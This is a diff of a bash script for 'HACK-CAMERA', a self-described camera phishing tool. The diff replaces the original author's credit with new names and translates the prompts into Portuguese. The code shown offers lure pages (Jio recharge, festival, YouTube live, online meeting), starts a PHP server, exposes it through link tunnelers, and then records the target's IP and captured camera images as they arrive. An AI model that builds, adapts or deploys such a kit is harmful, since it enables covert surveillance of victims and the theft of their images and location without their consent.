@@ -41,7 +41,7 @@ ${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \
 ${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
 ${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
 ${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${green}                                               [By X PHANTOM (PH4N7OM)]
+${green}                                               [By LEO MODS OFC E REAL RUSSAN HACKER]
 "
 
 # Package Installer
@@ -263,7 +263,7 @@ if $termux; then
     if echo "$path" | grep -q "home"; then
         printf ""
     else
-        echo -e "${error}Invalid directory. Run from home!\007\n"
+        echo -e "${error}Diretório inválido. Corra de casa!\007\n"
         killer; exit 1
     fi
 fi
@@ -354,21 +354,21 @@ while true; do
 clear
 echo -e "$logo"
 sleep 1
-echo -e "${ask}Choose an option:
-${red}[${white}1${red}] ${cyan}Jio Recharge
+echo -e "${ask}Escolha uma opção:
+${red}[${white}1${red}] ${cyan}Recarga Jio
 ${red}[${white}2${red}] ${cyan}Festival
 ${red}[${white}3${red}] ${cyan}Live Youtube
-${red}[${white}4${red}] ${cyan}Online Meeting
-${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
-${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
-${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
-${red}[${white}x${red}] ${cyan}About
-${red}[${white}m${red}] ${cyan}More tools
-${red}[${white}0${red}] ${cyan}Exit${blue}
+${red}[${white}4${red}] ${cyan}Reunião Online
+${red}[${white}d${red}] ${cyan}Alterar diretório de imagens (atual: ${red}${FOL}${yellow})
+${red}[${white}p${red}] ${cyan}Alterar porta padrão (atual: ${red}${PORT}${yellow})
+${red}[${white}t${red}] ${cyan}Alterar Tunelizador Padrão (atual: ${red}${TN}${yellow})
+${red}[${white}x${red}] ${cyan}Sobre
+${red}[${white}m${red}] ${cyan}Mais ferramentas
+${red}[${white}0${red}] ${cyan}sair${blue}
 "
 
 sleep 1
-printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
+printf "${cyan}\nLEO MODS OFC${nc}@${blue}REAL RUSSAN HACKER ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -376,10 +376,10 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Entrar no festival name:${cyan}\n\nLEO MODS OFC${nc}@${blue}XREAL RUSSAN HACKER ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
-            echo -e "\n${error}Invalid input!\n\007"
+            echo -e "\n${error}Entrada inválida!\n\007"
             sleep 1
         else
             fest_name="${fest_name//[[:space:]]/}"
@@ -387,10 +387,10 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nLEO MODS OFC${nc}@${blue}XREAL RUSSAN HACKER ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
-            echo -e "\n${error}Invalid input!\n\007"
+            echo -e "\n${error}Entrada inválida!\n\007"
             sleep 1
         else
             break
@@ -405,14 +405,14 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Entrar no diretório:${cyan}\n\nLEO MODS OFC${nc}@${blue}XREAL RUSSAN HACKER ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
-            echo -e "\n${error}Invalid directory!\n\007"
+            echo -e "\n${error}Diretório inválido!\n\007"
             sleep 1
         else
             export FOL="$dire"
-            echo -e "\n${success}Directory changed successfully!\n"
+            echo -e "\n${success}Diretório alterado com sucesso!\n"
             sleep 1
         fi
     elif echo $option | grep -q "x"; then
@@ -420,19 +420,19 @@ read option
         echo -e "$logo"
         echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
 $red[Version]    ${cyan} :[2.1]
-$red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
-$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
-$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
-printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
+$red[Description]${cyan} :[CAMERA PHISHING TOOL]
+$red[CRIADORES]     ${cyan} :[LEO MODS OFC E REAL RUSSAN HACKER]
+$red[TELEGRAM]     ${cyan} :[https://t.me/LEOMODZOFC] 
+$red[JUNTE-SE A NÓS] ${cyan} :[https://bit.ly/3PV3S3r]
+$red[TELEGRAM]   ${cyan} :[https://t.me/RUSSANHACKER]"
+printf "${cyan}\nLEO MODS OFC${nc}@${cyan}REAL RUSSAN HACKER ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://bit.ly/3PV3S3r"
     elif echo $option | grep -q "0"; then
         exit 0
     else
-        echo -e "\n${error}Invalid input!\007"
+        echo -e "\n${error}Entrada inválida!\007"
         sleep 1
     fi
 done
@@ -454,14 +454,14 @@ fi
 
 # Hotspot required for termux
 if $termux; then
-echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
+echo -e "\n${info}Se você não ativou o hotspot, ative-o!"
 sleep 3
 fi
-echo -e "\n${info}Starting PHP Server at 127.0.0.1:7777\n"
+echo -e "\n${info}Iniciando o servidor PHP em 127.0.0.1:7777\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
 sleep 2
-echo -e "${info}Starting link tunnelers......\n"
+echo -e "${info}Iniciando tuneladores de link......\n"
 if [ -e "$HOME/.cffolder/log.txt" ]; then
 rm -rf "$HOME/.cffolder/log.txt"
 fi
@@ -517,14 +517,14 @@ if echo "$status" | grep -q "404"; then
     echo -e "${error}PHP couldn't start!\n\007"
     killer; exit 1
 else
-    echo -e "${success}PHP started succesfully!\n"
+    echo -e "${success}PHP começou com sucesso!\n"
 fi
 sleep 1
 rm -rf ip.txt
 echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
 while true; do
     if [[ -e "ip.txt" ]]; then
-        echo -e "\007${success}Target opened the link!\n"
+        echo -e "\007${success}O alvo abriu o link!\n"
         while IFS= read -r line; do
             echo -e "${green}[${blue}*${green}]${yellow} $line"
         done < ip.txt
@@ -534,7 +534,7 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
+        echo -e "\007${success}ARQUIVO DE IMAGEM RECEBIDO! DOWNLOAD...\n"
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
